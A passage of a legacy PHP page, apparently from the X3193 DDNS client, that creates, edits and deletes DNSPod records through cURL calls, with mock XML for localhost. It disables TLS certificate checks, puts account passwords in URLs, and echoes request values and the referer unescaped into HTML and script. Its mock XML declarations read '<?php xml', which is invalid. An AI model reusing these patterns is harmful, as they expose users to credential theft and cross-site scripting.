                        //$record_type = "A,CNAME,MX,TXT,URL,NS,AAAA";
                        //echo $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;

                        for ($record_typei = 0;$record_typei < count(split("[,]",$record_type));$record_typei++){
                        ?>
                                <OPTION VALUE="<?php echo arrmember(split("[,]",$record_type),($record_typei))?>" <?php if(trim(request("record_type"))==arrmember(split("[,]",$record_type),$record_typei)) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_type),($record_typei))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        <SELECT name="record_line" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                        <?php 
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record line success.</message>'.
                                                '<created_at>2010-10-07 14:56:40</created_at>'.
                                                '</status>'.
                                                '<lines>'.
                                                '<item><![CDATA[默认]]></item>'.
                                                '<item><![CDATA[电信]]></item>'.
                                                '<item><![CDATA[网通]]></item>'.
                                                '<item><![CDATA[教育网]]></item>'.
                                                '<item><![CDATA[移动]]></item>'.
                                                '<item><![CDATA[铁通]]></item>'.
                                                '<item><![CDATA[国外]]></item>'.
                                                '</lines>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Line";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_grade' => trim(request("grade")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       

                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }

                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        $objList = $objXml->getElementsByTagName("item");               
                        $record_type = "";
                        for($i=0;$i<$objList->length;$i++){
                                if ($i=='0'){
                                        $record_line = $record_line.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                                else{
                                        $record_line = $record_line.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                        }
                        //$record_line = "默认,电信,网通,教育网,移动,铁通,国外";
                        for ($record_linei = 0; $record_linei < count(split("[,]",$record_line));$record_linei++){
                        ?>
                                <OPTION VALUE="<?php echo arrmember(split(",",$record_line),($record_linei))?>" <?php if (trim(request("record_line"))==arrmember(split("[,]",$record_line),($record_linei))) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_line),($record_linei))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        &nbsp记录值：<input type="text" class="text" name="value" value="" style="height:20px;width:15%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbspMX优先级：<input type="text" class="text" name="mx" value="" style="height:20px;width:5%;font-size:11px;" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbspTTL：<input type="text" class="text" name="ttl" value="" style="height:20px;width:5%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->textarea("#FCFC9D","") ?> name="checkcode" id="checkcode" maxlength="4" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                        <input type="hidden" class="text" name="refer" value="<?php echo trim($_SERVER['HTTP_REFERER'])?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php               }
                else{
                        
                        if (preg_match("/(?:([\w]*[.])*[\w]*)/i", trim(request("sub_domain")))) {
                        }
                        else{   
                                AlertBack ("记录或记录值格式错误！" , 2);
                        }       
                }
                if (trim(request("record_type")) != "A" && trim(request("record_type")) != "URL")
                        $rvalue = trim(request("value")).".";
                else
                        $rvalue = trim(request("value"));
                if (trim(request("mx")) == "")  
                        $rmx = "10";
                elseif (trim(request("mx")) > "20")
                        $rmx = "20";
                elseif (trim(request("mx")) < "0")
                        $rmx = "1";
                else
                        $rmx = trim(request("mx"));
                if (trim(request("ttl")) == "")
                        $rttl = "600";
                elseif (trim(request("ttl")) > "604800")
                        $rttl = "604800";
                elseif (trim(request("ttl")) < "0")
                        $rttl = "1";
                else
                        $rttl = trim(request("ttl"));
                //echo trim(request("record_line"));
                //return;       
                if (trim(request("record_type")) != "" && trim(request("record_line")) != "" && trim(request("value")) != ""){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Record created success</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '<record>'.
                                                '<id>419616</id>'.
                                                '<name>test1163078446</name>'.
                                                '</record>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Create";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domainid")),
                                        'sub_domain' => trim(request("sub_domain")),
                                        'record_type' => trim(request("record_type")),
                                        'record_line' => iconv('gb2312','UTF-8',trim(request("record_line"))),
                                        'value' => $rvalue,
                                        'mx' => $rmx,
                                        'ttl' => $rttl,
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);                              

                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue !== true){
                        }
                        elseif ($objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 2);
                }
                                
                if (trim(request("sub_domain")) == "" || trim(request("record_type")) == "" || trim(request("record_line")) == "" || trim(request("value")) == ""){
                }
                else{   
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);                              

                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == '1'){
                        }
                        elseif ($objXml->getElementsByTagName("code")->item(0)->nodeValue != "1"){
                                //AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 1);
                        }        
                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名添加成功！子域名ID：<?php echo $objXml->getElementsByTagName("id")->item(0)->nodeValue?> 实际子域名记录：<?php echo $objXml->getElementsByTagName("name")->item(0)->nodeValue." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
        <?php 
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";
        ?>
</table>                        
        <?php               
                        }
                        else{
                                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名添加失败！原因<?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?> <?php echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
        <?php 
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";
        ?>
</table>                        
        <?php               
                        
                        }
                }
                break;   // action - Record.Create end
        case "Record.Modify": // action - Record.Modify start
                if (trim(request("edit")) == "1"){
?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> ] >> <?php  echo "<a style='color:#000000' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainid=".trim(request("domain_id"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>".trim(request("topdomain"))."</a>";?>  </td>
        </tr>
</table>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="50">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=dnspod&domain_id=<?php echo trim(request("domain_id"))?>&record_id=<?php echo trim(request("record_id"))?>&action=<?php echo encodeuri("Record.Modify")?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor?>" method="post" name="dnspod">
                        &nbsp记录名：<input type="text" class="text" name="sub_domain" value="<?php echo trim(request("sub_domain"))?>" style="height:20px;width:15%;font-size:11px;" <?php  $style->textarea("#FCFC9D","") ?>>  
                        <SELECT name="record_type" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                        <?php 
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record type success.</message>'.
                                                '<created_at>2010-10-07 14:52:43</created_at>'.
                                                '</status>'.
                                                '<types>'.
                                                '<item>A</item>'.
                                                '<item>CNAME</item>'.
                                                '<item>MX</item>'.
                                                '<item>TXT</item>'.
                                                '<item>URL</item>'.
                                                '<item>NS</item>'.
                                                '<item>AAAA</item>'.
                                                '</types>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Type";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_grade' => trim(request("grade")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       

                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }
                                                
                        //echo $xmlstr;
                        //return;
                        
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        $objList = $objXml->getElementsByTagName("item");               
                        $record_type = "";
                        for($i=0;$i<$objList->length;$i++){
                                if ($i=='0'){
                                        $record_type = $record_type.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                                else{
                                        $record_type = $record_type.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                        }
                        //echo $record_type;
                        //return;
                        //$record_type = "A,CNAME,MX,TXT,URL,NS,AAAA";
                        //echo $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
                        
                        //$record_type = "A,CNAME,MX,TXT,URL,NS,AAAA";
                        for ($record_typei = 0;$record_typei < count(split("[,]",$record_type));$record_typei++){
                        ?>
                                <OPTION VALUE="<?php echo arrmember(split("[,]",$record_type),($record_typei))?>" <?php if(trim(request("record_type"))==arrmember(split("[,]",$record_type),$record_typei)) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_type),($record_typei))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        <SELECT name="record_line" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                        <?php 
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record line success.</message>'.
                                                '<created_at>2010-10-07 14:56:40</created_at>'.
                                                '</status>'.
                                                '<lines>'.
                                                '<item><![CDATA[默认]]></item>'.
                                                '<item><![CDATA[电信]]></item>'.
                                                '<item><![CDATA[网通]]></item>'.
                                                '<item><![CDATA[教育网]]></item>'.
                                                '<item><![CDATA[移动]]></item>'.
                                                '<item><![CDATA[铁通]]></item>'.
                                                '<item><![CDATA[国外]]></item>'.
                                                '</lines>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Line";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_grade' => trim(request("grade")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       

                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }

                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        $objList = $objXml->getElementsByTagName("item");               
                        $record_type = "";
                        for($i=0;$i<$objList->length;$i++){
                                if ($i=='0'){
                                        $record_line = $record_line.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                                else{
                                        $record_line = $record_line.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                        }
                        //$record_line = "默认,电信,网通,教育网,移动,铁通,国外";
                        for ($record_linei = 0; $record_linei < count(split("[,]",$record_line));$record_linei++){
                        ?>
                                <OPTION VALUE="<?php echo arrmember(split(",",$record_line),($record_linei))?>" <?php if (trim(request("record_line"))==arrmember(split("[,]",$record_line),($record_linei))) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_line),($record_linei))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        &nbsp记录值：<input type="text" class="text" name="value" value="<?php echo trim(request("value"))?>" style="height:20px;width:15%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbspMX优先级：<input type="text" class="text" name="mx" value="<?php echo trim(request("mx"))?>" style="height:20px;width:5%;font-size:11px;" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbspTTL：<input type="text" class="text" name="ttl" value="<?php echo trim(request("ttl"))?>" style="height:20px;width:5%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->textarea("#FCFC9D","") ?> name="checkcode" id="checkcode" maxlength="4" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                        <input type="hidden" class="text" name="refer" value="<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']))?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php               }
                else{
                        
                        if (preg_match("/(?:([\w]*[.])*[\w]*)/i", trim(request("sub_domain")))) {
                        }
                        else{   
                                //echo trim(request("sub_domain"));
                                AlertBack ("记录或记录值格式错误！" , 2);
                        }       
                }
                if (trim(request("edit")) == "0"){
                        if (trim(request("record_type")) != "A" && trim(request("record_type")) != "URL")
                                if (strripos(trim(request("value")),".") == (strlen(trim(request("value")))-1))
                                        $rvalue = trim(request("value"));
                                else
                                        $rvalue = trim(request("value")).".";
                        else
                                $rvalue = trim(request("value"));
                        if (trim(request("mx")) == "" && trim(request("record_type")) == "MX")  
                                $rmx = "10";
                        elseif (floor(trim(request("mx"))) > "20" && trim(request("record_type")) == "MX")
                                $rmx = "20";
                        elseif (floor(trim(request("mx"))) < "0" && trim(request("record_type")) == "MX")
                                $rmx = "0";
                        elseif (trim(request("record_type")) == "MX")
                                $rmx = trim(request("mx"));
                                
                        if (trim(request("ttl")) == "")
                                $rttl = "10";
                        elseif (trim(request("ttl")) > "604800")
                                $rttl = "604800";
                        elseif (trim(request("ttl")) < "0")
                                $rttl = "1";
                        else
                                $rttl = trim(request("ttl"));
                        if (trim(request("record_type")) != "" && trim(request("record_line")) != "" && trim(request("value")) != ""){
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                        '<dnspod>'.
                                                        '<status>'.
                                                        '<code>1</code>'.
                                                        '<message>Record created success</message>'.
                                                        '<created_at>2010-10-08 09:23:30</created_at>'.
                                                        '</status>'.
                                                        '<record>'.
                                                        '<id>5246140</id>'.
                                                        '<name>1286501010</name>'.
                                                        '</record>'.
                                                        '</dnspod>';
                                }       
                                else{   
                                        $ch = curl_init();
                                        $url = "https://dnsapi.cn/Record.Modify";
                                        $data = array(
                                                'login_email' => $dnspoduname,
                                                'login_password' => $dnspodpwd,
                                                'domain_id' => trim(request("domain_id")),
                                                'record_id' => trim(request("record_id")),
                                                'sub_domain' => trim(request("sub_domain")),
                                                'record_type' => trim(request("record_type")),
                                                'record_line' => iconv('gb2312','UTF-8',trim(request("record_line"))),
                                                'value' => $rvalue,
                                                'mx' => $rmx,
                                                'ttl' => $rttl,
                                                'format' => 'xml'
                                        );
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");                                
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                        $xmlstr = curl_exec($ch);
                                        curl_close($ch);
                                }
                        }       
                        
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);                              

                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue !== true){
                        }
                        elseif ($objXml->getElementsByTagName("code")->item(0)->nodeValue != "1"){
                                //AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 1);
                        }        
                        
                }               
                
                if (trim(request("edit")) == "1"){
                }
                else{   
                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名修改成功！子域名ID：<?php echo $objXml->getElementsByTagName("id")->item(0)->nodeValue?> 实际子域名记录：<?php echo $objXml->getElementsByTagName("name")->item(0)->nodeValue." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
        <?php 
                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";
        ?>
</table>                        
        <?php 
                        }
                        else{
                                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名修改失败！原因：<?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
        <?php 
                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";
        ?>
</table>                        
        <?php 
                        }
                }
        
                break;   // action - Record.Modify end  
        case "Record.Remove": // action - Record.Remove start
                if (trim(request("delok")) == "1"){
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>

        <script language="vbscript">
        <!--
                Dim delok
                delok = MsgBox("是否删除该相册！", vbOKCancel, "X3193")
                If delok = vbOK Or delok = vbYes Then
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1"
                else    
                        MsgBox("该相册删除取消！")
                        window.location.href="<?php echo trim(request("refer"))?>"
                End If
        //-->
        </script>
                <?php 
                        break;
                     }
                }
                if (trim(request("domain_id")) != "" && trim(request("record_id")) != ""){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Record deleted.</message>'.
                                                '<created_at>2008-11-26 16:16:09</created_at>'.
                                                '</status>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Remove";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domain_id")),
                                        'record_id' => trim(request("record_id")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                }
                elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) > 0){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $totalrecord = '220';                   
                                $xmlstr = '<?php xml version="1.0" encoding="utf-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record list success</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '<info>'.
                                                '<record_total>'.$totalrecord.'</record_total>'.
                                                '</info>'.
                                                '<records>';
                                if (ceil($totalrecord/$pagesize) > $page){
                                        $strpagesize = $pagesize;
                                }       
                                elseif (ceil($totalrecord/$pagesize) == $page){
                                        $strpagesize = fmod($totalrecord,$pagesize);
                                }                       
                                for($i=1;$i<=$strpagesize;$i++){
                                        $xmlstr = $xmlstr.
                                                '<item>'.
                                                '<id>5246120</id>'.
                                                '<name>@</name>'.
                                                '<line><![CDATA[默认]]></line>'.
                                                '<type>A</type>'.
                                                '<ttl>600</ttl>'.
                                                '<value>1.1.1.1</value>'.
                                                '<mx>0</mx>'.
                                                '<enabled>1</enabled>'.
                                                '<updated_on>2010-10-07 14:14:20</updated_on>'.
                                                '</item>';
                                }               
                                $xmlstr = $xmlstr.
                                                '</records>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.List";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domain_id")),
                                        'offset' => $pagesize*($page-1),
                                        'length' => $pagesize,
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       
                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }
                        if (strpos($xmlstr, '<?php xml version="1.0" encoding="utf-8"')==0){
                                $xmlstr = preg_replace("/(.*)(\<\?xml version=\"1.0\" encoding=\"utf-8\"\?\>)(.*)/", "\$1"."<?php xml version=\"1.0\" encoding=\"gb2312\"?>"."\$3", $xmlstr);
                        }                       
                        
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);
                        
                        $objList = $objXml->getElementsByTagName("item");                       
                        if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;

                        $totalitem = $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }       

                        for($i = 0;$i <= $strpagesize-1;$i++){
                                $objHdd = $objList->item($i);
                                if ($_POST["chidd".$i] != ""){
